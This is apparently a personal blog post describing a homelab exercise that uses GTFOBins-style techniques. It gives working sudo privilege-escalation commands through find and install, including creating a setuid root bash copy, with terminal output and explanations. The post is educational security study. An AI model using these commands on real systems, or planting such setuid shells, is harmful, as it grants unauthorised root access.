---
title: "Bypassing Local Security with Standard Binaries"
excerpt: A few examples of how one might exploit poorly configured systems using standard Linux programs
date: 2025-09-23
---

I recently discovered the website [GTFOBins](https://gtfobins.github.io/) while working on a CTF-challenge. To cite the website:

> The project collects legitimate functions of Unix binaries that can be used to break out of restricted shells, escalate or maintain elevated privileges, transfer files, spawn bind and reverse shells, and facilitate the other post-exploitation tasks.
>
> It is important to note that this is not a list of exploits, and the programs listed here are not vulnerable per se, rather, GTFOBins is a compendium about how to live off the land when you only have certain binaries available.

I toyed around with some common binaries, just to see how easy privilege escalation can be under certain circumstances.

### Setting up a Misconfigured System

In my Kali Linux homelab I started by setting up a new user `dummy` with substantially lower privileges. This is done with `sudo adduser dummy`. I decided to allow this user to run the binaries `find` and `install` with sudo-privileges, as this seems like a somewhat realistic real-world scenario (granted, this should obviously still not occur in privilege-sensitive systems). To do this, we edit (as root) the `sudoers` file with `sudo visudo` and add the following two lines:
```text
dummy ALL=(ALL) NOPASSWD: /usr/bin/find
dummy ALL=(ALL) NOPASSWD: /usr/bin/install
```
As long as `sudoers` contains the line
```text
Defaults        secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
```
we can now use `sudo find` and `sudo install` without appending `/usr/bin/` every time.

### Escalating with `find`

First, we simulate lower privileges by logging onto the dummy account with `su - dummy` and entering the password. Then the syntax is very straightforward:
```console
┌──(dummy㉿kali)-[~]
└─$ sudo find . -exec /bin/sh \; -quit                                                         
# whoami
root
# id
uid=0(root) gid=0(root) groups=0(root)
```
In more detail, this is what the snippet does:
1. `find` starts searching in the current directory.
2. `-exec /bin/sh \;` tells `find` to spawn a new shell each time a file is encountered.
3. `-quit` tells `find` to stop spawning shells after the first one.
4. Since we ran the command with `sudo`, it spawns **root** shells, and we have access to the file system.

#### Escalating with `install`

The entire "exploit" goes as follows:
```console
┌──(dummy㉿kali)-[~]
└─$ sudo install -m 6777 /bin/bash ~/rootshell
┌──(dummy㉿kali)-[~]
└─$ ~/rootshell -p                                                                             
rootshell-5.2# whoami
root
rootshell-5.2# id
uid=1001(dummy) gid=1001(dummy) euid=0(root) egid=0(root) groups=0(root),100(users),1001(dummy)
```
Here is a breakdown of the above procedure:
1. The idea is to copy the binary `/bin/bash` to the home directory with _setuid_ root permissions.
2. The key part is the `-m 6777`, which sets the setuid bit so it should run as root.
    - `-m` sets the mode of the file. 6777 is an _octal_ representation of those permissions.
    - Each owner/group/others has 7 = 4+2+1 = rwx (read, write, execute), so 777 = full access for everyone.
    - The leading digit being `6xxx` tells us that we're enabling setuid and setgid. Setuid (4xxx) does the following: when you run the file, it executes with the **user ID** of the file’s owner (instead of the one running it). If root owns the file, then the program runs with root privileges. Setgid works similarly, but with the **group ID** instead.
3. We name the copy `rootshell` and save it in `~/`.
4. Lastly, we run the binary with the option `-p`, so it doesn’t drop privileges. This gives us a root shell with access to the file system.







